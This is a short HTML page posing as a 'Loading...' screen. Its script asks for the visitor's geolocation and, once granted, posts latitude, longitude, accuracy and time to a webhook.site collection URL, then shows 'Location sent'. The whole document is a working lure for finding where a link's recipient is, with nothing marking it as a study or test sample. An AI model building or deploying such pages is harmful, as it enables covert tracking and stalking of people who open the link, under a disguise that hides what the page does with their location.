<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading</title>
</head>
<body>
  <p>Loading...</p>

  <script>
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        fetch("https://webhook.site/4fe24142-54cb-425b-bcf2-efbd3566d252", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            time: new Date().toISOString()
          })
        });

        alert("Location sent");
      },
      function() {
        document.body.innerHTML = "Permission denied";
      }
    );
  </script>
</body>
</html>
